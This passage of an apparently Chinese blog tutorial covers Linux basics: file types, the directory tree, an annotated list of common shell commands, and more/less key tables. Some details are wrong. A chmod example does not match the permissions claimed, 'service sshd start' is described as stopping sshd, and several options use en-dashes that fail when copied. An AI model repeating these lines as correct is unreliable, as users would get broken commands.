<li>设备文件（b，block） ： 用来访问块设备比如硬盘、软盘。</li>
<li>管道文件（p，pipe）：一种特殊类型的文件，用于进程之间的通信。</li>
<li>套接字（s，socket）：用于进程间的网络通信，也可以用于本机之间的非网络通信。</li>
</ul>
<h3 id="Linux-目录树"><a href="#Linux-目录树" class="headerlink" title="Linux 目录树"></a>Linux 目录树</h3><p>所有可操作的计算机资源都存在于目录树这个结构中，对计算资源的访问，可以看做是对这棵目录树的访问。</p>
<p><strong>Linux 的目录结构如下：</strong></p>
<p>Linux 文件系统的结构层次鲜明，就像一棵倒立的树，最顶层是其根目录： </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848885.png" alt="Linux目录树"></p>
<p>常见目录说明：</p>
<ul>
<li>&#x2F;bin：存放二进制可执行文件（ls、cat、mkdir 等），常用命令一般都在这里。</li>
<li>&#x2F;etc：存放系统管理和配置文件。</li>
<li>&#x2F;home：存放所有用户文件的根目录，是用户主目录的基点，比如用户 user 的主目录就是&#x2F;home&#x2F;user，可以用~user 表示。</li>
<li>&#x2F;usr ：用于存放系统应用程序。</li>
<li>&#x2F;opt：额外安装的可选应用程序包所放置的位置。一般情况下，可以把 tomcat 等都安装到这里。</li>
<li>&#x2F;proc：虚拟文件系统目录，是系统内存的映射。可直接访问这个目录来获取系统信息。</li>
<li>&#x2F;root：超级用户（系统管理员）的主目录（特权阶级）。</li>
<li>&#x2F;sbin：存放二进制可执行文件，只有 root 才能访问。这里存放的是系统管理员使用的系统级别的管理命令和程序。如 ifconfig 等。</li>
<li>&#x2F;dev： 用于存放设备文件。</li>
<li>&#x2F;mnt： 系统管理员安装临时文件系统的安装点，系统提供这个目录是让用户临时挂载其他的文件系统。</li>
<li>&#x2F;boot： 存放用于系统引导时使用的各种文件。</li>
<li>&#x2F;lib ： 存放着和系统运行相关的库文件。</li>
<li>&#x2F;tmp： 用于存放各种临时文件，是公用的临时文件存储点。</li>
<li>&#x2F;var： 用于存放运行时需要改变数据的文件，也是某些大文件的溢出区，比方说各种服务的日志文件（系统启动日志等）等。</li>
<li>&#x2F;lost+found： 这个目录平时是空的，系统非正常关机而留下“无家可归”的文件（windows 下叫什么.chk）就在这里。</li>
</ul>
<h2 id="Linux-基本命令"><a href="#Linux-基本命令" class="headerlink" title="Linux 基本命令"></a>Linux 基本命令</h2><h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>在Linux里面总是“白发人送黑发人”，子进程死亡，父进程透过wait()等待子进程死亡，并清理子进程僵尸，当然父进程也可以因此而获得子进程的死亡原因。</p>
<p>kill 父进程，子进程可能会死亡；实际情况是这两种情况都有可能发生，取决A进程的状态。如果A进程是会话首进程，那么A退出后，B进程也会退出；反之如果A进程不是会话首进程，那么A退出后，B进程不会退出。</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过<span class="built_in">alias</span>命令可以查看命令别名</span></span><br><span class="line">alias</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">定义新的别名</span></span><br><span class="line">alias rmall = &#x27;rm -rf&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">取消别名</span></span><br><span class="line">unalias rmall</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到用户主目录</span></span><br><span class="line">cd ~</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到上一个操作所在目录</span></span><br><span class="line">cd -</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">文件的创建（增）</span></span><br><span class="line">touch 文件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">文件查看</span> </span><br><span class="line">cat/more/less/tail 文件名称</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以对某个文件进行动态监控</span></span><br><span class="line">tail -f 文件</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机自启</span></span><br><span class="line">chmod +x zookeeper</span><br><span class="line">chkconfig --add zookeeper</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看是否添加成功</span></span><br><span class="line">chkconfig --list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">global search regular expression</span></span><br><span class="line">grep 要搜索的字符串 要搜索的文件 --color</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前系统正在运行进程</span></span><br><span class="line">ps -ef</span><br><span class="line">ps -aux</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前系统的端口使用</span></span><br><span class="line">netstat -an</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VIM</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拷贝当前行 yy , 拷贝当前行向下的 5 行 5yy，并粘贴 p。【快捷键在正常模式下使用】</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除当前行 <span class="built_in">dd</span> , 删除当前行向下的 5 行 5dd</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在文件中查找某个单词 (命令模式下 /关键字 ， 回车 查找 , 输入 n 就是查找下一个)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置文件的行号，取消文件的行号.[命令行下 : <span class="built_in">set</span> nu 和 :<span class="built_in">set</span> nonu]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑 /etc/profile 文件，使用快捷键到底文档的最末行[G]和最首行[gg] 【正常模式下】</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在一个文件中输入 “hello” ,然后又撤销这个动作 u 【正常模式下】</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑 /etc/profile 文件，并将光标移动到 20 行 <span class="built_in">shift</span>+g</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">set</span> nu</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">:20</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">立刻关机</span></span><br><span class="line">shutdown -h now</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1分钟后关机</span></span><br><span class="line">shutdown -h 1</span><br><span class="line">shutdown -r now</span><br><span class="line">shutdown -r 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定 5 分钟后关机，同时送出警告信息给登入用户</span></span><br><span class="line">shutdown +5 &quot;System will shutdown after 5 minutes&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">立刻关机</span></span><br><span class="line">halt </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">立刻重启</span></span><br><span class="line">reboot  </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在重启和关机前，通常需要先执行，把内存的数据，写入磁盘</span></span><br><span class="line">sync </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">会自动创建用户组</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用useradd指令所建立的帐号，实际上是保存在 /etc/passwd文本文件中。</span></span><br><span class="line">useradd xiaoming</span><br><span class="line">passwd xiaoming</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示用户账号密码信息</span></span><br><span class="line">passwd -S 用户名</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除用户密码</span></span><br><span class="line">passwd -d 用户名</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目录保留</span></span><br><span class="line">userdel xiaoming</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除目录</span></span><br><span class="line">userdel -r xiaoming</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询用户信息</span></span><br><span class="line">id mingwhuang</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换用户</span></span><br><span class="line">su</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回原来的用户</span></span><br><span class="line">exit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用户组的管理涉及用户组的添加、删除和修改。组的增加、删除和修改实际上就是对/etc/group文件的更新。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新增组</span></span><br><span class="line">groupadd 组名</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">增加用户是直接加上组</span></span><br><span class="line">useradd -g 用户组 用户名</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除组，组内不能有用户</span></span><br><span class="line">groupdel 组名</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改用户组的属性</span></span><br><span class="line">groupmod 选项 用户组</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改用户组</span></span><br><span class="line">usermod -g 新的组名 用户名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line">man ls</span><br><span class="line">help ls</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示隐藏文件</span></span><br><span class="line">ls -la</span><br><span class="line">ll</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建多级目录用-p参数</span></span><br><span class="line">mkdir -p /home/test</span><br><span class="line">rmdir</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归删除，强制删除</span></span><br><span class="line">rm -rf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建空文件</span></span><br><span class="line">touch</span><br><span class="line">cp [选项] source【源】 dest【目的文件】 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">回到家目录</span></span><br><span class="line">cd </span><br><span class="line">cd ~</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">回到根</span></span><br><span class="line">cd /</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> 只能浏览文件，而不能修改文件，为了浏览方便，一般会带上 管道命令 | more</span></span><br><span class="line">cat test.txt | more #(把 cat xxx.txt 输出结果交给 more 处理)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">more 指令是一个基于 VI 编辑器的文本过滤器，它以全屏幕的方式按页显示文本文件的内容。more指令中内置了若干快捷键</span></span><br><span class="line">more text.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">less 指令用来分屏查看文件内容，它的功能与 more 指令类似，但是比 more 指令更加强大，支持各 种显示终端。less 指令在显示文件内容时，并不是一次将整个文件加载之后才显示，而是根据显示需要加载内容，对于显示大型文件具有较高的效率。</span></span><br><span class="line">less text.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出内容到控制台</span></span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">head -n 5 text.txt</span><br><span class="line"></span><br><span class="line">tail -n 5 text.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实时追踪该文档的所有更新</span></span><br><span class="line">tail -f </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&gt;输出重定向 会覆盖  &gt;&gt; 不会覆盖 追加</span></span><br><span class="line">ls –l /home/ &gt; /home/info.txt #[如果文件不存在，则会自动创建]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">ln</span>类似于windows里的快捷方式，主要存放了链接其他文件的路径</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在/home 目录下创建一个软连接 linkToRoot，连接到 /root 目录</span></span><br><span class="line">ln -s /root/ linkToRoot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除软连接 linkToRoot</span></span><br><span class="line">rm -rf linkToRoot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">当我们使用 <span class="built_in">pwd</span> 指令查看目录时，仍然看到的是软链接所在目录。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">history</span> 查看已经执行过历史命令,也可以执行历史指令</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看最近10条</span></span><br><span class="line">history 10</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行编号为5的指令</span></span><br><span class="line">!5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">date</span></span></span><br><span class="line">date</span><br><span class="line">date +%Y</span><br><span class="line">date +%m</span><br><span class="line">date +%d</span><br><span class="line">date &quot;+%Y-%m-%d %H:%M:%S&quot; #(功能描述:显示年月日时分秒)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置时间</span></span><br><span class="line">date -s &quot;2020-11-11 11:22:22&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">恢复时间</span></span><br><span class="line">yum -y install ntp ntpdate</span><br><span class="line">service ntp stop</span><br><span class="line">ntpdate cn.pool.ntp.org</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">日历</span></span><br><span class="line">cal</span><br><span class="line">cal 2020</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出当前目录及子目录下所有文件和文件夹</span></span><br><span class="line">find .</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/home目录下查找以.txt 结尾的文件名</span></span><br><span class="line">find /home -name &quot;*.txt&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">忽略大小写</span></span><br><span class="line">find /home -iname &quot;*.txt&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当前目录及子目录下查找所有以.txt 和.pdf 结尾的文件</span></span><br><span class="line">find . -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">find [搜索范围] [选项]</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">按文件名:根据名称查找/home 目录下的 hello.txt 文件</span></span><br><span class="line">find /home -name hello.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">按拥有者:查找/opt 目录下，用户名称为 nobody 的文件</span></span><br><span class="line">find /opt -user nobody</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查找整个 linux 系统下大于 10M 的文件(+n 大于 -n 小于 n 等于)</span></span><br><span class="line">find / -size +10M</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">locate指令可以快速定位文件路径。locate指令利用事先建立的系统中所有文件名称及路径的locate数据库实现快速定位给定的文件。Locate 指令无需遍历整个文件系统，查询速度较快。为了保证查询结 果的准确度，管理员必须定期更新 locate 时刻。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">由于 locate 指令基于数据库进行查询，所以第一次运行前，必须使用 updatedb 指令创建 locate 数据库。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">locate 与 find 不同: find 是去硬盘找，locate 只在 /var/lib/slocate 资料库中找。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">locate 的速度比 find 快，它并不是真的查找，而是查数据库，一般文件数据库在 /var/lib/slocate/slocate.db 中，所以 locate 的查找并不是实时的，而是以数据库的更新为准，一般是系统自己维护，也可以手工升级数据库</span></span><br><span class="line">yum -y install mlocate</span><br><span class="line">updatedb</span><br><span class="line">locate text.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">grep 过滤查找 ， 管道符，“|”，表示将前一个命令的处理结果输出传递给后面的命令处理。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在 /etc/profile 文件中，查找 <span class="string">&quot;if&quot;</span> 所在行，并且显示行号</span></span><br><span class="line">grep –n if /etc/profile # [在/etc/profile 中查找 if ,并显示行，区别大小写]</span><br><span class="line">grep –ni if /etc/profile # [在/etc/profile 中查找 if ,并显示行，不区别大小写]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">gzip/gunzip 指令,压缩了之后原来的文件不在了</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">zip/unzip 指令</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将 /home 下的 所有文件进行压缩成 mypackage.zip [退出 home]</span> </span><br><span class="line">zip -r mypackage.zip /home/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将 mypackge.zip 解压到 /opt/tmp 目录下</span></span><br><span class="line">unzip –d /opt/tmp mypackage.zip #[如果/opt/tmp 不存在，会自动创建]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar指令 -c 产生.tar打包文件 -v 显示详细信息 -f 指定压缩后的文件名 -z 打包同时压缩 -x 解包.tar文件</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">压缩多个文件，将 /home/a1.txt 和 /home/a2.txt 压缩成 a.tar.gz</span></span><br><span class="line">tar -zcvf a.tar.gz a1.txt a2.txt #[注意，路径要写清楚]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将/home 的文件夹 压缩成 myhome.tar.gz</span></span><br><span class="line">tar -zcvf myhome.tar.gz /home/</span><br><span class="line">tar -zxvf a.tar.gz</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将 myhome.tar.gz 解压到 /opt/tmp2 目录下 【-C】</span></span><br><span class="line">tar -zxvf myhome.tar.gz -C /opt/tmp2 #[注意; /opt/tmp2 事先需要创建好]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改文件所有者</span></span><br><span class="line">chown mingwhuang text.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改组</span></span><br><span class="line">chgrp mingwhuang text.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一种方式：+ 、-、= 变更权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">u:所有者 g:所有组 o:其他人 a:所有人(u、g、o的总和)</span></span><br><span class="line"></span><br><span class="line">chmod  u=rwx,g=rx,o=x  文件、目录 【表示：给所有者rwx, 给所在组的用户 rx, 给其他人 x】</span><br><span class="line">chmod  o+w  文件、目录 【表示：给其它用户增加w 的权限】</span><br><span class="line">chmod  a-x  文件、目录 【表示：给所有用户 去掉 x权限】</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">给abc文件 的所有者读写执行的权限，给所在组读执行权限，给其它组读执行权限。</span></span><br><span class="line">chmod u=rwx, g=rx ,o=rx  abc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">给abc文件的所有者除去执行的权限，增加组写的权限</span></span><br><span class="line">chmod u-x, g+w abc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">给abc文件的所有用户添加读的权限</span></span><br><span class="line">chmod a+r abc </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第二种方式：通过数字变更权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">r=4 w=2 x=1        rwx=4+2+1=7</span></span><br><span class="line">chmod u=rwx,g=rx,o=x   文件、目录 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">相当于 <span class="built_in">chmod</span>   751  文件、目录</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将 /home/abc.txt 文件的权限修改成  rwxr-xr-x, 使用给数字的方式实现：</span></span><br><span class="line">chmod  u=rwx, g=xr, o=x /home/abc.txt</span><br><span class="line">chmod 751 /home/abc.txt</span><br><span class="line"></span><br><span class="line">chown  newowner  file  改变文件的所有者</span><br><span class="line">chown  newowner:newgroup  file  改变用户的所有者和所有组</span><br><span class="line">-R   如果是目录 则使其下所有子文件或目录递归生效</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将 /home/abc.txt 文件的所有者修改成 tom</span></span><br><span class="line">chown   tom  /home/abc.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将 /home/kkk 目录下所有的文件和目录的所有者都修改成tom</span></span><br><span class="line">chown –R tom  /home/kkk</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将home下的所有文件和目录的所有者都改成 tom，将所在组改成police</span></span><br><span class="line">chown –R  tom:police   /home/ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chgrp newgroup file  改变文件的所有组</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将 /home/abc .txt 文件的所在组修改成 shaolin (少林)</span></span><br><span class="line">chgrp  shaolin  /home/abc.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将 /home/kkk 目录下所有的文件和目录的所在组都修改成 shaolin(少林)</span></span><br><span class="line">chgrp  -R  shaolin /home/kkk </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改网卡配置</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ONBOOT是指明在系统启动时是否激活网卡，只有在激活状态的网卡才能去连接网络，进行网络通讯</span></span><br><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改网关配置</span></span><br><span class="line">vi /etc/sysconfig/network</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改DNS配置</span></span><br><span class="line">vi /etc/resolv.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查端口占用</span></span><br><span class="line">netstat -tunlp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">io 读写</span></span><br><span class="line">iotop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-an  按一定顺序排列输出</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-p  显示哪个进程在调用</span></span><br><span class="line">netstat -anp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询已安装的rpm列表</span> </span><br><span class="line">rpm -qa|grep firefox</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">i=install 安装 v=verbose 提示 h=<span class="built_in">hash</span> 进度条</span></span><br><span class="line">rpm -ivh RPM包全路径名称</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示所有的进程</span></span><br><span class="line">ps -aux</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以全格式显示当前所有的进程，查看进程的父进程</span></span><br><span class="line">ps -ef</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">踢掉某个非法登录用户【jack】</span></span><br><span class="line">ps -aux | grep sshd</span><br><span class="line">kill -9 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">终止远程登录服务 sshd, 在适当时候再次重启 sshd 服务</span></span><br><span class="line">service sshd start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">终止多个gedit编辑器</span></span><br><span class="line">killall gedit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">强行杀掉一个终端</span></span><br><span class="line">kill -9 对应的bash的进程号</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sevice 管理</span></span><br><span class="line">service 服务名 [start | stop | restart | reload | status] </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在 CentOS7.0 后 不再使用 service ,而是 systemctl</span></span><br><span class="line">systemctl [start | stop | restart | reload | status] 服务名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列举系统有哪些服务</span></span><br><span class="line">ls -l /etc/init.d</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">check config</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过chkconfig 命令可以给每个服务的各个运行级别设置自启动/关闭</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示当前系统所有服务的各个运行级别的运行状态</span> </span><br><span class="line">chkconfig --list</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看sshd服务的运行状态</span></span><br><span class="line">chkconfig sshd –list 或者 chkconfig –list | grep sshd</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将sshd 服务在运行级别5下设置为不自动启动，看看有什么效果？</span></span><br><span class="line">chkconfig –level 5 sshd off</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">当运行级别为5时，关闭防火墙。</span></span><br><span class="line">chkconfig –level 5 iptables off</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在所有运行级别下，关闭防火墙</span></span><br><span class="line">chkconfig iptables off</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在所有运行级别下，开启防火墙</span></span><br><span class="line">chkconfig  iptables on</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用细节</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">chkconfig重新设置服务后自启动或关闭，重启机器就会按设置的状态运行.</span>   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果不小心将默认的运行级别设置成 0 或者 7 ，怎么处理？</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入单用户模式，修改成正常的即可</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置任务调度文件</span></span><br><span class="line">vim /etc/crontab</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-e 编辑crontab定时任务 -l 查询crontab任务 -r 删除当前用户所有得定时任务</span></span><br><span class="line">crontab -e</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每小时的每分钟执行 <span class="built_in">ls</span> –l /etc/ &gt; /tmp/to.txt命令</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一个* 分钟 第二个* 小时 第三个* 天 第四个* 月 第五个* 星期几</span></span><br><span class="line">*/1 * * * * ls –l /etc/ &gt; /tmp/to.txt </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每天的8点0分，12点0分，16点0分都执行一次命令</span></span><br><span class="line">0 8,12,16 * * *</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在周一到周六的凌晨5点0分执行命令</span></span><br><span class="line">0 5 * * 1-6</span><br></pre></td></tr></table></figure>

<h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><table>
<thead>
<tr>
<th>操作</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>空白键  (space)</td>
<td>代表向下翻一页；</td>
</tr>
<tr>
<td>Enter</td>
<td>代表向下翻『一行』；</td>
</tr>
<tr>
<td>q</td>
<td>代表立刻离开 more ，不再显示该文件内容。</td>
</tr>
<tr>
<td>Ctrl+F</td>
<td>向下滚动一屏</td>
</tr>
<tr>
<td>Ctrl+B</td>
<td>返回上一屏</td>
</tr>
<tr>
<td>&#x3D;</td>
<td>输出当前行的行号</td>
</tr>
<tr>
<td>:f</td>
<td>输出文件名和当前行的行号</td>
</tr>
</tbody></table>
<h4 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h4><table>
<thead>
<tr>
<th>操作</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>空白键  (space)</td>
<td>代表向下翻一页；</td>
</tr>
<tr>
<td>Enter</td>
<td>代表向下翻『一行』；</td>
</tr>
<tr>
<td>q</td>
<td>代表立刻离开 more ，不再显示该文件内容。</td>
</tr>
<tr>
<td>Ctrl+F</td>
<td>向下滚动一屏</td>
</tr>
<tr>
<td>Ctrl+B</td>
<td>返回上一屏</td>
</tr>
<tr>
<td>&#x3D;</td>
<td>输出当前行的行号</td>
</tr>
<tr>
<td>:f</td>
<td>输出文件名和当前行的行号</td>
</tr>
</tbody></table>
